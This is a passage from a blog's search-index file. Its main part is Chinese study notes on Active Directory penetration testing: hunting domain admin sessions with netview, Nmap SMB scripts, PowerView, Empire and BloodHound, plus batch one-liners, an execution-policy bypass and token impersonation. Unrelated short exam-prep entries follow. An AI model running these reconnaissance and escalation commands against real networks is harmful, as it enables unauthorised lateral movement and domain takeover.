<p>使用语法：<br>netview.exe &lt;参数&gt;<br>-h：显示帮助菜单。<br>-f filename.txt：指定从中提取主机列表的文件。<br>-e filename.txt：指定要排除的主机名文件。<br>-o filename.txt：将所有输出重定向到文件。<br>-d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。<br>-g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。<br> -c：检查对已找到共享的访问权限。</p>
<p>2.4：Nmap的NSE脚本<br>如果有域账户或者本地账户，就可以使用 Nmap 的 smb-enum-sessions.nse 引擎来获取远程机器的登录会话，并且不需要管理员权限。smb-enum-sessions.nse 的下载地址为：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html%E3%80%82">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html。</a></p>
<p>smb-enum-domains.nse：对域控制器进行信息收集，可以获取主机信息、用户、密码策略可<br>以使用的用户等。<br>smb-enum-users.nse：在进行域渗透测试的时候，如果获取了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描。<br>smb-enum-shares.nse：遍历远程主机的共享目录。<br>smb-enum-processes.nse：对主机的系统进程进行遍历。通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙及杀毒软件。<br>smb-enum-sessions.nse：获取域内主机的用户登录会话，查看当前是否有用户登录。<br>smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、全称域名、域林名称、NetBIOS 机器名、NetBIOS 域名、工作组、系统时间。</p>
<p>2.5：PowerView脚本<br>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p>
<p>Invoke-StealthUserHunter ：只需要一次查询，就可以获取域内的所有用户。从user.HomeDirectories 中提取所有用户，并对每个服务器进行 Get-NetSessions 获取。因为不需要使用 Invoke-UserHunter 对每台机器进行操作，所以这个方法的隐蔽性相对较高，但涉及的机器面不一定完整。默认使用 Invoke-StealthUserHunter，如果找不到需要的信息，就接着使用 Invoke-UserHunter 方法。</p>
<p>Invoke-UserHunter：找到域内特定的用户群。它接收用户名、用户列表或域组查询，并接收一个主机列表或查询可用的主机域名。它会使用 Get-NetSessions 和 Get-NetLoggedon（调用 NetSessionEnum 和 NetWkstaUserEnum API）扫描每个服务器，而且会比较结果，筛选出目标用户集。使用这个工具是不需要管理员权限的。在本地绕过执行该脚本。</p>
<p>2.6：Empire下的user_hunter模块<br>在 Empire 下也存在类似 Invoke-UserHunter 的模块——user_hunter，这个模块就是用来查找域管理员登录的机器的。</p>
<p>使用 usemodule situational_awareness/network/powerview/user_hunter 模块可以清楚地看到哪个用户登录了哪台主机。在这里，显示域管理员曾经登录了机器名为 WIN7-64.shuteer.testlab、IP 地址为 192.168.31.251 的机器。</p>
<p>2.11 查找域管理进程<br>一个典型的域权限提升过程通常围绕着收集明文凭据或者通过 Mimikatz 来获得提升的权限等方法，然后在其所获取管理员权限的系统中寻找域管理员登录进程，从而收集域管理员的凭据。</p>
<p>我们来看一种假设的情况：渗透测试人员在某个内网环境中获得了一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，找出有哪些用户登录了这台服务器上。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时也没有域管理员组的用户登录这台服务器，那么他会选择另一个账户，继续寻找这个账户在内网哪个机器上具有管理权限，再枚举这台机器上的登录用户，并继续进行渗透测试，直至找到一个有效的路径可以获取到域管理员权限为止。在具有成千上万台计算机和用户的环境中，该过程可能需要几天甚至几周的时间。</p>
<p>1：本机检查<br>1.1：获取域管理员列表</p>
<p>net group “Domain Admins” /domain<br>当前有一个域管理员：administrator</p>
<p>1.2：列出本机所有进程及进程用户</p>
<p>tasklist /v</p>
<p>1.3：寻找进程所有者为域管理员的进程<br>通过以上操作可以看出，当前存在域管理员进程，这种方法只是有几率能查找到域管理员进程，在实际情况下往往并非如此。</p>
<p>2：查询域控制器的域用户会话<br>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p>
<p>2.1：查询域控制器列表<br>可以使用LDAP查询从Domain Controlles单元中收集的域控制器列表。也可以使用net命令查询域控制器列表。</p>
<p>net group “Domain Controllers” /domain</p>
<p>2.2：收集域管理员列表<br>可以使用LDAP进行查询。也可以使用net命令，从域管理员组中收集域管理员列表。</p>
<p>net group “Domain Admins” /domain</p>
<p>2.3：收集所有活动域的会话列表<br>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe它包含本地Windows函数netsessionenum。</p>
<p>netsess.exe -h</p>
<p>2.4：交叉引用域管理员列表与活动会话列表<br>对域管理员列表和活动会话列表进行交叉引用，可以确定哪些IP地址有活动域令牌。也可以通过下列脚本快速使用netsess.exe的Windows命令行。</p>
<p>将域控制器列表添加到dcs.txt中，将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下，运行脚本会在当前目录下生成一个文本文件sessions.txt：</p>
<p>FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</p>
<p>3：查询远程系统中运行的任务<br>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理员任务。</p>
<p>首先，从Domain Admins组中收集域管理员列表：</p>
<p>net group “Domain Admins” /domain</p>
<p>然后运行如下脚本，将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt文件中：</p>
<p>FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</p>
<p>4：扫描远程系统的NetBIOS信息<br>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户，下面这个Windows命令行脚本就用于扫描远程系统活跃域中的管理会话。</p>
<p>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i<br>同样，吧目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到admins.txt文件中，同目录运行脚本：</p>
<p>2.12 域管理员模拟方法简介<br>如果您已经有一个 meterpreter 会话，您可以使用 Incognito模拟域管理员，或添加一个新的域 管理员。通过尝试遍历系统中所有可用的授权令牌来随意添加新的管理员。</p>
<p>2.13 利用PowerShell收集域信息<br>PowerShell可以理解为增强版的”cmd.exe”，打开方式就是：运行-&gt;输入powershell：</p>
<p>如果想执行一个Powershell脚本，需要修改Powershell的默认权限为执行权限。PowerShell常用的执行权限有四种：</p>
<p>Restricted：默认设置，不允许执行任何脚本。<br>Allsigned：只能运行经过证书验证的脚本。<br>Unrestricted：权限最高，可以执行任意脚本。<br>RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。<br>在PowerShell中输入Get-ExecutionPolicy，可以查看权限：</p>
<p>如果想要修改权限就可以执行这条命令，然后选择Y：</p>
<p>Set-ExecutionPolicy 权限名</p>
<p>powerview<br>powerview这个脚本是一款依赖于 powershell 和 WMI 对内网进行查询的常用渗透测试脚本。</p>
<p>下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p>导入脚本 powerview.ps1：</p>
<p>import-module .\powerview.ps1</p>
<p>Powerview中常用的命令</p>
<p>Get-NetDomain：获取当前用户所在的域名称。<br>Get-NetUser：返回所有用户的详细信息。<br>Get-NetDomainController：获取所有域控制器。<br>Get-NetComputer：获取所有域内机器的详细信息。<br>Get-NetOU：获取域中的 OU 信息。<br>Get-NetGroup：获取所有域内组和组成员信息。<br>Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。<br>Get-NetShare：获取当前域内所有网络共享。<br>Get-NetSession：获取在指定服务器存在的会话信息。<br>Get-NetRDPSession：获取在指定服务器存在的远程连接信息。<br>Get-NetProcess：获取远程主机的进程信息。<br>Get-UserEvent：获取指定用户的日志信息。<br>Get-ADObject：获取活动目录的对象信息。<br>Get-NetGPO：获取域所有组策略对象。<br>Get-DomainPolicy：获取域默认或域控制器策略。<br>Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限。<br>Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。<br>Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器。<br>获取当前用户所在的域名称</p>
<p>Get-NetDomain</p>
<p>返回所有用户的详细信息</p>
<p>获取所有域控制器</p>
<p>Get-NetDomainController</p>
<p>获取所有域内机器的详细信息</p>
<p>Get-NetComputer</p>
<p>获取域中的 OU 信息</p>
<p>Get-NetOU</p>
<p>获取所有域内组和组成员信息</p>
<p>Get-NetGroup</p>
<p>根据 SPN 获取当前域使用的文件服务器</p>
<p>Get-NetFileServer</p>
<p>获取当前域内所有网络共享</p>
<p>Get-NetShare</p>
<p>获取在指定服务器存在的会话信息</p>
<p>Get-NetSession</p>
<p>获取在指定服务器存在的远程连接信息</p>
<p>Get-NetRDPSession</p>
<p>获取远程主机的进程信息</p>
<p>Get-NetProcess</p>
<p>获取指定用户的日志信息</p>
<p>Get-UserEvent</p>
<p>获取活动目录的对象信息</p>
<p>Get-ADObject</p>
<p>获取域所有组策略对象</p>
<p>Get-NetGPO</p>
<p>获取域默认或域控制器策略</p>
<p>Get-DomainPolicy</p>
<p>用于获取域用户登录计算机及该用户是否有本地管理权限</p>
<p>Invoke-UserHunter</p>
<p>查找域内所有机器进程用于找到某特定用户</p>
<p>Invoke-ProcessHunter</p>
<p>根据用户日志获取某域用户登录过哪些域机器</p>
<p>Invoke-UserEventHunter</p>
<p>CMD运行powershell</p>
<p>powershell -exec bypass “import-module c:\powerview.ps1;get-netuser”</p>
<p>2.14 域渗透分析工具bloodhound的使用<br>安装BloodHound所需环境</p>
<p>1、下载安装JDK<br>JDK8下载地址：<a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a></p>
<p>2、下载安装Neo4j<br>下载地址：<a href="https://neo4j.com/download-center/#releases">https://neo4j.com/download-center/#releases</a></p>
<p>3、启动Neo4j数据库服务端<br>下载好后，进入对应的目录在命令行运行如下命令启动（必须安装JDK环境才可以）</p>
<p>cd C:\neo4j-community-3.5.3\bin<br>neo4j.bat console</p>
<p>通过浏览器打开：<a href="http://localhost:7474/">http://localhost:7474/</a></p>
<p>打开后设置一下密码：原密码neo4j，修改为：123456（任意）</p>
<p>4、下载BloodHound<br>下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p>
<p>然后打开：</p>
<p>输入账号密码：eno4j、123456</p>
<p>查找所有域管理员。<br>寻找到达域管理员的最短路径。<br>查找具有 dcsync权限的主体。<br>具有外部域组成员身份的用户。<br>具有外部域组成员身份的组。<br>映射域信任。<br>无约束委托系统的最短路径。<br>从 KerberoAstable 用户获得的最短路径。<br>从 KerberoAstable 用户到域管理员的最短路径。<br>拥有主体的最短路径。<br>从所属主体到域管理员的最短路径。<br>高价值目标的最短路径。<br>再下载：<a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe">https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe</a></p>
<p>放到C盘下：</p>
<p>然后运行：</p>
<p>SharpHound.exe -c all</p>
<p>运行完后会在当前路径下生成一个文件：2020032.png”-webkit-tap-highlight-color: rgba(0, 0, 0, 0);font-size: 14.6667px;margin-top: 1em;margin-bottom: 1em;color: rgb(22, 18, 9);font-family: “Microsoft Jhenghei”, “Lantinghei SC”, lanting, “PingFang SC”, “Seguo UI”, “Microsoft Yahei”, Arial;white-space: normal;background-color: rgb(255, 255, 255);”&gt;</p>
<p>然后我们吧他拖进去上传：</p>
<p>这个时候就有数据了：</p>
<p>查找所有域管理员</p>
<p>寻找最短到达域管理员的路径</p>
<p>查找具有 dcsync权限的主体</p>
<p>查看指定用户与域关联的详细信息<br>点一下用户就会在左边显示：</p>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a><br><a href="https://www.cnblogs.com/KevinGeorge/p/10513211.html">https://www.cnblogs.com/KevinGeorge/p/10513211.html</a><br><a href="https://www.cnblogs.com/backlion/p/10643132.html">https://www.cnblogs.com/backlion/p/10643132.html</a></p>
<p>2.15 敏感数据防护<br>内网核心敏感数据，不仅仅包括数据库、电子邮件。还包括个人数据及组织的业务数据…可以说，价值高的数据基本上都在内网中，所以要了解攻击者的操作流程，这会对内网数据安全防护工作至关重要。</p>
<p>1：资料、数据、文件的定位流程<br>内网数据防护的第一步，就是要熟悉攻击者获取数据的流程。在实际的网络环境中，攻击者主要通过各种恶意方法来定位公司内部各相关人员的机器。从而获取资料、数据、文件等重要信息。文件定位大致流程如下：</p>
<p>定位内部人事组织结构</p>
<p>在内部人事组织结构中寻找需要监视的人员</p>
<p>定位相关人员的机器</p>
<p>监视相关人员存放文档的位置</p>
<p>列出存放文档的服务器的目录</p>
<p>2：重点核心业务机器及敏感信息防护<br>重点核心业务机器是攻击者比较关心的机器，因此，我们需要对这些机器采取相应的安全防护措施。</p>
<p>1．核心业务机器<br>高管/系统管理员/财务/人事/业务人员的个人计算机。<br>产品管理系统服务器（仓库管理系统） 。<br>OA 办公系统服务器。<br>财务应用系统服务器。<br>核心产品源码服务器（对于 IT公司，会架设自己的 SVN 或者 GIT 服务器） 。<br>数据库服务器。<br>文件服务器/共享服务器。<br>邮件服务器。<br>网络监控系统服务器。<br>其他服务器（分公司、工厂）。</p>
<p>2．各类敏感文件信息<br>站点源码备份文件、数据库备份文件、配置文件备份等（后缀 XX.zip，XX.sql 等） 。<br>各类数据库的 Web 管理入口，如 phpmyadmin、adminer等。<br>浏览器密码和浏览器 cookie（IE、Chrome、Firefox） 。<br>其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。<br>Windows 无线密码。<br>目标内部的各种账号和密码信息，包括邮箱、VPN、FTP、TeamView 等。<br>3：应用于文件形式信息的防护<br>总体来说，渗透测试人员对于这一步的工作，一是要了解已攻陷机器所属人员的职位（通常 一个高职位的人在内网中的权限比一般员工要高，在他的计算机内也会有很多重要的、敏感的个 人或公司内部文件），二是要在该机器中通过一些搜索命令来寻找自己所需要的资料。用户在内网 中工作时，建议不要将一些特别重要的资料放在公开的计算机中，必要时一定要对 Office 文档进 行加密，密码也不要太过于简单（对低版本的 Office 软件，如 Office 2003，在网上很容易找到一些破解软件进行破解；对高版本的 Office 软件，也可以通过微软 Sysinternals Suite 套件中的抓取 Dump 的工具 procdump 来获取密码） 。</p>
<p>2.16 分析域内网段划分情况及拓扑图结构<br>要养成一个习惯，在掌握了内网相关信息后，可以做一个拓扑图来帮助我们分析内网网络的分布情况。</p>
<p>1：基本架构<br>我们还需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。</p>
<p>ASP + Access + IIS 5.0/6.0 + Windows Sever 2003</p>
<p>ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008</p>
<p>PHP + MySQL + IIS</p>
<p>PHP + MySQL + Apache</p>
<p>PHP + MySQL + Ngnix</p>
<p>JSP + MySQL + Ngnix</p>
<p>JSP + MSSQL + Tomcat</p>
<p>JSP + Oracle + Tomcat</p>
<p>2：域内网划分<br>内网的环境判断，首先需要分析内网 IP 地址的分布情况。一般可以通过内网中的路由器、交 换机等设备，以及 SNMP、弱口令等，来获取内网网络拓扑或 DNS 域传送的信息。一般的大公司 都会有内部网站，渗透测试人员也可通过内部网站的公开链接找出部门的 IP 地址段。内部网络是怎么划分的？是按照部门划分网段，按照楼层划分网段，还是按照地区划分网段？内网通常可分为 DMZ 区、办公区和核心区（生产区） 。了解整个内网的网络分布和组成，也有助 于渗透测试人员了解内网的核心业务。</p>
<p>1．DMZ 区<br>在实际的渗透测试中，大多数情况下，在外围 Web 中拿到的权限在 DMZ 区。这个区域不属 于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理，DMZ 区会处在内网区能够访问 DMZ 区而 DMZ 区访问不了内网区的情况下，相关知识在第 1 章中已经详细讲解过，此处不再重 复。</p>
<p>2．办公区<br>办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本 防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网 信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入 办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等。</p>
<p>3．核心区<br>核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全 设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服 务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时，会优先查找这些主机。核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等。<br>通过获取的目标主机及所在域的各类信息，就可以绘制内网的拓扑结构图，在后续的渗透测 试中，对照拓扑图可以更快地了解目标域网内部环境，准确定位内网具体目标。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>信息搜集</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>408题型总结</title>
    <url>/2021/10/16/408%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h1><p><img src="https://ckcah.github.io/images/408/image-20211016185916712.png" alt="image-20211016185916712.png"></p>
<h1 id="CO"><a href="#CO" class="headerlink" title="CO"></a>CO</h1><h1 id="CN"><a href="#CN" class="headerlink" title="CN"></a>CN</h1><h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>真题总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>备忘录</title>
    <url>/2021/10/16/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<p>插入视频</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">&quot;480&quot;</span> <span class="attr">height</span>=<span class="string">&quot;320&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">https://www.bilibili.com/video/BV1GB4y1w7ns</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <tags>
        <tag>无</tag>
      </tags>
  </entry>
  <entry>
    <title>政治背诵脑图</title>
    <url>/2021/10/28/%E6%94%BF%E6%B2%BB%E8%83%8C%E8%AF%B5%E8%84%91%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="马原"><a href="#马原" class="headerlink" title="马原"></a>马原</h1><p><a href="https://ckcah.github.io/images/%E6%94%BF%E6%B2%BB/%E9%A9%AC%E5%8E%9F%E8%AE%B2%E4%B9%891-6%E8%8A%82%E9%9B%86%E5%90%88.pdf">马原讲义1-6节集合</a></p>
<h1 id="史纲"><a href="#史纲" class="headerlink" title="史纲"></a>史纲</h1><p><a href="https://ckcah.github.io/images/%E6%94%BF%E6%B2%BB/%E5%8F%B2%E7%BA%B2%E6%97%B6%E9%97%B4%E8%BD%B4.pdf">史纲时间轴</a></p>
<p><img src="https://ckcah.github.io/images/%E6%94%BF%E6%B2%BB/%E5%8F%B2%E7%BA%B2%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE01.jpg" alt="img"></p>
<p><img src="https://ckcah.github.io/images/%E6%94%BF%E6%B2%BB/%E5%8F%B2%E7%BA%B2%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE02.jpg" alt="img"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>政治背诵</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
</search>
